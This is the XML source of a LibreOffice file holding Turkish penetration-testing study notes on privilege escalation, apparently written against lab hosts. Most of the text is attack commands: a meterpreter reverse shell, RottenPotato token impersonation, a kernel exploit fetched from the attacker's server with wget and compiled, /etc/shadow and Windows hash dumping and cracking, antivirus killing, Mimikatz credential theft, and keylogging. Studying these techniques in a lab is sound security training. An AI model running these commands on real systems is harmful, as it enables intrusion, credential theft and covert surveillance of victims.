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paragraph-rsid="001a4133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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00409163" officeooo:paragraph-rsid="00409163" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0048cd34" officeooo:paragraph-rsid="0048cd34" style:font-size-asian="8.75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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004a8199" officeooo:paragraph-rsid="004a8199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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="0048cd34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Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004b28b6" officeooo:paragraph-rsid="004b28b6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Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004c2f25" officeooo:paragraph-rsid="004c2f25" style:font-size-asian="8.75pt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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004c5574" officeooo:paragraph-rsid="004c5574" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="004e418a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="003ee919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224b12" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="0048cd34" officeooo:paragraph-rsid="0048cd34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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="003ee919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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="0048cd34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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004c2f25" officeooo:paragraph-rsid="004c2f25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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004c2f25" officeooo:paragraph-rsid="004c5574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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="004e418a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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="11pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="004e418a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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00511962" officeooo:paragraph-rsid="00511962" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0052e19e" officeooo:paragraph-rsid="0052e19e" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0052e19e" officeooo:paragraph-rsid="0052e19e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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00511962" officeooo:paragraph-rsid="00511962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0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0052e19e" officeooo:paragraph-rsid="0052e19e" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0048cd34"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="004a8199"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="004b28b6"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="004c5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8. PRIVELEGE ESCALATION SALDIRILARI</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P12">Windows ta <text:span text:style-name="T1">Yetki Yükseltme <text:s/>(otomatik)</text:span></text:p>
      <text:p text:style-name="P10">set payload windows/x64/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P3">msf de windows meterpreter açtık.</text:p>
      <text:p text:style-name="P3">Getuid <text:span text:style-name="T2">(NT AUTHORITY\LOCAL SERVICE)</text:span> , getprivs, shell, whoami /priv, whoami /all</text:p>
      <text:p text:style-name="P3">ps de otoriteleri görüyoruz.</text:p>
      <text:p text:style-name="P3">list_tokens -u</text:p>
      <text:p text:style-name="P3">list_tokens -g</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">search windows kernel could</text:p>
      <text:p text:style-name="P4">session belirtip run ediyoruz.</text:p>
      <text:p text:style-name="P4">Getuid <text:s/>(NT AUTHORITY\SYSTEM)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P13">Windows ta <text:span text:style-name="T1">Yetki Yükseltme <text:s/>(manuel)</text:span></text:p>
      <text:p text:style-name="P6">meterpreter a girdik </text:p>
      <text:p text:style-name="P6">getuid <text:span text:style-name="T2">(NT AUTHORITY\LOCAL SERVICE)</text:span></text:p>
      <text:p text:style-name="P6">cd %temp%</text:p>
      <text:p text:style-name="P6">upload /root/Desktop/rottenpotato.exe</text:p>
      <text:p text:style-name="P6">shell</text:p>
      <text:p text:style-name="P6">rottenpotato.exe <text:s/>(DCOM connection terminated <text:s/>bunu alınca ctrl+C çekiyoruz)</text:p>
      <text:p text:style-name="P6">load incognito</text:p>
      <text:p text:style-name="P6">list_tokens -u</text:p>
      <text:p text:style-name="P6">impersonate_token "NT AUTHORITY\SYSTEM"</text:p>
      <text:p text:style-name="P6">getuid <text:s/>(NT AUTHORITY\SYSTEM)</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Linux</text:span> ta <text:span text:style-name="T1">Yetki Yükseltme <text:s/>(manuel)</text:span></text:p>
      <text:p text:style-name="P2">./mod_ssl_exploit 0x6b 10.10.10.12 -c 40</text:p>
      <text:p text:style-name="P2">whoami, <text:span text:style-name="T3">id <text:s/>ile sorduk ama root değiliz..</text:span></text:p>
      <text:p text:style-name="P6">uname -r </text:p>
      <text:p text:style-name="P6">sistem bilgisinden exploit dosyasını bulduk</text:p>
      <text:p text:style-name="P6">karşıya atacağımız dosya ile root olacağız, dosyayı atabilmek için http.server oluyoruz. <text:s text:c="2"/>(python -m http.server)</text:p>
      <text:p text:style-name="P6">wget <text:a xlink:type="simple" xlink:href="http://10.10.10.80:8000/3.c" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.80:8000/3.c</text:a> <text:s/>(desktopa atılan dosyayı çektik)</text:p>
      <text:p text:style-name="P6">gcc 3.c -o 3 <text:s text:c="2"/>(karşıda 3 olarak compile ettik)</text:p>
      <text:p text:style-name="P6">./3 <text:s/>(exe çalıştırdık ve rootuz)</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P14">Linux Hash Dump ve Crack</text:p>
      <text:p text:style-name="P7">dosya alacağımız için http.server olduk.</text:p>
      <text:p text:style-name="P7">cat /etc/passwd <text:s text:c="2"/>(şifreleri verdi.)</text:p>
      <text:p text:style-name="P7">cat /etc/shadow <text:s text:c="2"/>(hashleri verdi.)</text:p>
      <text:p text:style-name="P7">hashleri kopyalayıp txt yaptık.</text:p>
      <text:p text:style-name="P7">hashcat -m 500 -a 0 -o linux-pass.txt shadow.txt /root/Desktop/wordlist_files/pass.txt --status --force</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P15"><text:span text:style-name="T4">Windows</text:span> Hash Dump ve Crack</text:p>
      <text:p text:style-name="P8">Windowsta meterpreter session açtık</text:p>
      <text:p text:style-name="P8">use exploit/windows/local/ms18_8120_win32k_privesc</text:p>
      <text:p text:style-name="P8">set session</text:p>
      <text:p text:style-name="P8">run</text:p>
      <text:p text:style-name="P8">run post/windows/gather/smart_hashdump <text:s text:c="2"/>(hash leri aldık)</text:p>
      <text:p text:style-name="P8">cd %temp% <text:s/></text:p>
      <text:p text:style-name="P8">upload /root/Desktop/pwdump8.exe</text:p>
      <text:p text:style-name="P8">execute -f pwdump8.exe -i</text:p>
      <text:p text:style-name="P17"><text:soft-page-break/>crack</text:p>
      <text:p text:style-name="P8">john win-hashes.txt --format=NT</text:p>
      <text:p text:style-name="P9">john win-hashes.txt --format=NT --wordlist wordlist_files/pass.txt</text:p>
      <text:p text:style-name="P8">john win-hashes.txt --format=NT –show</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P16">Migration İşlemi</text:p>
      <text:p text:style-name="P18">meterpreter girip root olduk</text:p>
      <text:p text:style-name="P18">ps explorer <text:s text:c="8"/>(explorer, migrate edilebilecek bir yerdir.)</text:p>
      <text:p text:style-name="P18">ps <text:s text:c="17"/>(tüm çalışan uygulamaları görüyoruz)</text:p>
      <text:p text:style-name="P18">ps vmtoolsd.exe <text:s text:c="4"/>(bunun yerine geçmeye karar verdik) <text:s text:c="3"/>(bit sayısı uyuyor)</text:p>
      <text:p text:style-name="P18"><text:s text:c="20"/>(user ı daha güçlü olanı seçeceğiz)</text:p>
      <text:p text:style-name="P18">migrate 2360 <text:s text:c="7"/>(ve migrate ettik.)</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P21">Meterpreter scriptleri ve Şifrelerin Elde Edilmesi</text:p>
      <text:p text:style-name="P19">migrate etmeden çoğu komut çalışmaz..</text:p>
      <text:p text:style-name="P19">run <text:s/>get_local_subnets</text:p>
      <text:p text:style-name="P19">run post/windows/gather/checkvm</text:p>
      <text:p text:style-name="P19">run getcountermeasure </text:p>
      <text:p text:style-name="P19">run post/windows/manage/killav</text:p>
      <text:p text:style-name="P19">run post/windows/manage/enable_rdp</text:p>
      <text:p text:style-name="P19">run gettelnet</text:p>
      <text:p text:style-name="P19">run hostsedit</text:p>
      <text:p text:style-name="P19">run winenum </text:p>
      <text:p text:style-name="P19">run scraper </text:p>
      <text:p text:style-name="P19">getpid</text:p>
      <text:p text:style-name="P19">load kiwi</text:p>
      <text:p text:style-name="P19">creds_all</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P22">Hedefte Keylogger Çalıştırma</text:p>
      <text:p text:style-name="P20">hedefte migrate ettikten sonra keylogger komutları kullanıyoruz</text:p>
      <text:p text:style-name="P20">keyscan_start, keyscan_dump, keyscan_stop </text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P22">Hedefte Screenshot Alma</text:p>
      <text:p text:style-name="P19">migrate etmiş haldeyken</text:p>
      <text:p text:style-name="P19">screenshot</text:p>
      <text:p text:style-name="P19">screenshot -v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4T23:04:19.966478403</dc:date>
    <meta:editing-duration>PT18H38M12S</meta:editing-duration>
    <meta:editing-cycles>41</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="78" meta:word-count="314" meta:character-count="2618" meta:non-whitespace-character-count="2300"/>
  </office:meta>
</office:document-meta>
</file>